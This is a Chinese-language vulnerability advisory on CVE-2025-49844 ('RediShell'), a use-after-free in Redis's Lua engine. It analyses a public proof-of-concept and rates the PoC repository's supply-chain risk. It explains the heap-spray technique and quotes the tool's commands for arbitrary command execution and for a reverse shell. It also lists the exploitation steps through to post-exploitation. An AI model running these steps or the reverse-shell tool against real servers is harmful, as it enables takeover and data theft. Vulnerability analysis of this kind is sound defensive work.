## CVE-2025-49844 - Redis Use-After-Free (UAF) / 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-49844

**漏洞类型:** Use-After-Free (UAF) / 远程代码执行 (RCE)

**影响应用:** Redis

**危害等级:** 超危

**CVSS评分:** 10.0

**影响版本:** 所有支持Lua脚本的Redis版本 (Redis 6.x-8.x全分支), 包括 8.2.1 及以下版本

**利用条件:** 需要认证 (低权限及以上用户)

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-49844 是 Redis 数据库中一个极其严重的漏洞，被评为 CVSS 10.0 满分，由 Wiz 团队在 Pwn2Own Berlin 大赛中发现，并被命名为 RediShell。该漏洞存在于 Redis 的 Lua 脚本执行模块中，本质是一个 Use-After-Free (UAF) 内存管理缺陷。它影响所有支持 Lua 脚本的 Redis 版本，包括 6.x 到 8.x 的所有分支，以及 8.2.1 及以下版本。

**漏洞详情**
该漏洞的核心在于 Redis 在处理 Lua 脚本时，一个关键的 `TString` 变量（通常用于表示 `chunkname`，即脚本块的名称）在某些特定条件下未能正确写入栈中。当 Lua 引擎的垃圾回收器（GC）被触发时，由于栈上缺乏对这个 `TString` 的强引用，它会被错误地回收。然而，在后续的 `luaX_setinput` 等操作中，程序仍然会尝试使用这个已经被释放的内存区域，从而导致 Use-After-Free 漏洞。攻击者通过精心构造的 Lua 脚本，并在具备低权限及以上用户身份认证后，可以利用此漏洞实现远程代码执行（RCE），完全控制受影响的 Redis 服务器及其底层操作系统。

**POC有效性分析**
此 POC 项目，名为 `CVE-2025-49844`，也称为 `RediShell`，旨在复现并利用该漏洞。根据 `README.md` 文件，该 POC 明确支持针对 x86-64 Linux 环境下的 `redis:8.2.1-alpine` 和 `redis:8.2.1-bookworm` Docker 镜像，这表明其具有高度的针对性和有效性。POC 提供了两种利用模式：
1.  **单向 Shell 命令执行**: 攻击者可以通过 `uv run cve-2025-49844 command "echo 'hello world' > /data/hello.txt"` 命令在目标 Redis 服务器上执行任意系统命令。
2.  **反向 Shell 连接**: 攻击者可以利用 `uv run cve-2025-49844 rshell -l 127.0.0.1 -p 4444` 命令，建立一个反向 Shell 连接到攻击者监听的主机，实现对目标系统的持久控制。
`demonstration.py` 文件是 POC 的核心部分，它详细展示了如何触发 UAF 漏洞。通过一个名为 `myloader` 的 Lua 加载器函数，在解析脚本时，它在 `f_parser` 尝试通过 `luaZ_lookahead` 填充 ZIO 缓冲区，并且 `chunkname` 处于可回收状态时，故意返回 `nil`，强制 Redis 重新尝试填充缓冲区。随后，通过显式调用 `collectgarbage("collect")` 触发垃圾回收，释放处于 Use-After-Free 状态的 `chunkname`。紧接着，`get_smallstrs` 函数被用于进行堆喷射，以攻击者控制的数据（例如，包含恶意指令的 Shellcode）覆盖被释放的 `chunkname` 内存区域。POC 中特别指出必须使用默认的 `chunkname`，以防止字符串值被添加到 `Proto::k` 并被 GC 标记，这进一步体现了开发者对漏洞原理的深入理解和精确利用。POC 项目依赖 `hexdump`、`iced-x86` 和 `redis` 等库，这些库在内存分析和底层操作中发挥作用，有助于确保利用的稳定性和成功率。综上所述，该 POC 功能完整、利用逻辑清晰，针对特定环境具有高有效性，可用于复现和验证 CVE-2025-49844 漏洞。

**利用步骤**
1.  **环境搭建**: 在一个可控的环境中部署受影响的 Redis 版本，例如基于 Docker 的 `redis:8.2.1-alpine` 或 `redis:8.2.1-bookworm` 镜像。确保 Redis 实例已启用认证机制（即便低权限用户也能连接）或处于无需认证即可访问的状态。
2.  **攻击机配置**: 在攻击者的机器上，安装 Python 环境和 `uv` 工具（或通过 `pip install -e .` 安装 POC 项目的依赖）。
3.  **连接与脚本上传**: 攻击者使用 POC 工具连接到目标 Redis 实例。POC 会自动构造并上传一个特制的 Lua 脚本到 Redis。
4.  **UAF 漏洞触发**: 上传的 Lua 脚本中的 `myloader` 函数会按照设计执行，在 Redis 内部处理 `chunkname` 时，通过返回 `nil` 和触发 `collectgarbage("collect")`，导致 `chunkname` 对应的内存被 Use-After-Free。
5.  **内存覆盖与代码注入**: 随后，POC 会执行一系列操作（即堆喷），用攻击者预设的恶意数据（例如包含 Shellcode 或其他指令）覆盖刚刚被释放的 `chunkname` 内存区域。
6.  **远程代码执行**: 当 Redis 尝试再次访问或使用已被劫持的 `chunkname` 时，它实际上会执行攻击者注入的恶意代码。POC 提供了两种主要形式的远程代码执行：直接在服务器上执行系统命令，或建立一个反向 Shell 回连到攻击者监听的主机。
7.  **后渗透**: 成功获取远程代码执行权限后，攻击者可以进一步进行数据窃取、系统提权、横向移动等后渗透活动。

**投毒风险分析**
该 POC 代码由个人开发者 `saneki` 发布在 GitHub 上，作为防御性安全研究工具，其本身旨在展示漏洞的利用方式，而非包含恶意载荷。对代码内容的详细分析发现：
*   `README.md` 和 `pyproject.toml` 文件清晰地描述了项目的目的、用法、支持的目标环境以及所需的标准 Python 依赖库，如 `hexdump`、`iced-x86` 和 `redis`。这些库均为安全领域常用的、无明显恶意行为的开源库。
*   `demonstration.py` 文件中的核心逻辑专注于构造一个能够触发 Redis Lua 引擎 UAF 漏洞的 Lua 脚本。其代码中没有发现任何试图下载、执行外部未知文件、植入后门程序、进行加密货币挖矿、窃取敏感数据或连接到可疑外部 C2 服务器的行为。
*   代码中未发现混淆技术、复杂的加密字符串或任何旨在隐藏真实意图的异常编程实践。其功能完全围绕 CVE-2025-49844 的利用展开，目的是复现并验证远程代码执行能力。
*   尽管该 POC 本身是“干净”的，但任何公开的漏洞利用代码都存在被恶意攻击者利用和二次改造的风险。攻击者可能会将此 POC 与恶意载荷捆绑，伪装成安全工具或补丁进行传播。

**结论**: 综合评估，该 POC 代码本身专注于漏洞利用的技术展示，逻辑清晰，无代码混淆，且未包含除漏洞利用本身以外的任何恶意行为或可疑外部请求。因此，该 POC 的**投毒风险评级为低 (10%)**。然而，建议用户在实际部署和使用前，务必从可靠来源获取代码，并进行独立的代码审计和安全扫描，以防范潜在的二次打包恶意版本。

**项目地址:** https://github.com/saneki/cve-2025-49844

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49844
